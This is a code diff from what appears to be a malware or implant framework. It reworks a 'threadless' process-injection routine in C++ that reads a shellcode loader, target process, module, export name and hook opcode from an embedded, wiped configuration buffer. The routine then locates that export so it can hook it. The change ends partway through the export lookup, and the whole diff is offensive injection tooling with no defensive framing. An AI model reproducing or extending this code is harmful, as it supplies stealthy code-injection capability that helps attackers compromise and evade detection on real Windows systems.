@@ -1,5 +1,7 @@
-#include <inject/include/injectlib.hpp>
+#include <inject/injectlib/injectlib.hpp>
+
 namespace Injection {
+    TXT_SECTION(F) BYTE Config[256] = { };
 
     VOID Entrypoint(HMODULE Base) {
         Memory::ContextInit();
@@ -9,24 +11,39 @@ namespace Injection {
     VOID Threadless(HMODULE Base) {
 
         HEXANE
-        PARSER Parser = {};
-        LPVOID Shellcode = {};
-        HANDLE Proc = {};
-        ORSRC Rsrc = {};
+        THREADLESS Threadless = { };
+        PARSER Parser       = { };
+        LPVOID Shellcode    = { };
+        HANDLE Proc         = { };
+        ORSRC Rsrc          = { };
 
-        ULONG Protect = 0;
-        UINT_PTR pExport = 0;
-        UINT_PTR exportCpy = 0;
-        UINT_PTR pHook = 0;
+        ULONG Protect       = 0;
+        UINT_PTR pExport    = 0;
+        UINT_PTR exportCpy  = 0;
+        UINT_PTR pHook      = 0;
 
-        SIZE_T Read, Write = 0;
-        SIZE_T cbShellcode = 0;
-        THREADLESS Threadless = {};
+        SIZE_T Read, Write  = 0;
+        SIZE_T cbShellcode  = 0;
 
         __debugbreak();
 
         Memory::ResolveApi();
-        Config::ReadConfig(&Threadless);
+        Parser::CreateParser(&Parser, Config, sizeof(Config));
+        x_memset(Config, 0, sizeof(Config));
+
+        //XteaCrypt(B_PTR(Parser.Handle), Parser.Length, Ctx->ConfigBytes.Key, FALSE);
+
+        Parser::ParserStrcpy(&Parser, LP_SPTR(&Ctx->Config.Key), nullptr);
+        Parser::ParserMemcpy(&Parser, LP_BPTR(&Ctx->Root), nullptr);
+        Parser::ParserMemcpy(&Parser, LP_BPTR(&Ctx->LE), nullptr);
+
+        Parser::ParserStrcpy(&Parser, &Threadless.Parent.Buffer, &Threadless.Parent.Length);
+        Parser::ParserStrcpy(&Parser, &Threadless.Module.Buffer, &Threadless.Module.Length);
+        Parser::ParserStrcpy(&Parser, &Threadless.Export.Buffer, &Threadless.Export.Length);
+        Parser::ParserStrcpy(&Parser, &Threadless.Opcode.Buffer, &Threadless.Opcode.Length);
+        Parser::ParserStrcpy(&Parser, &Threadless.Loader.Buffer, &Threadless.Loader.Length);
+
+        Parser::DestroyParser(&Parser);
 
         if (
             !(pExport = Memory::LdrGetExport(B_PTR(Threadless.Module.Buffer), B_PTR(Threadless.Export.Buffer))) ||
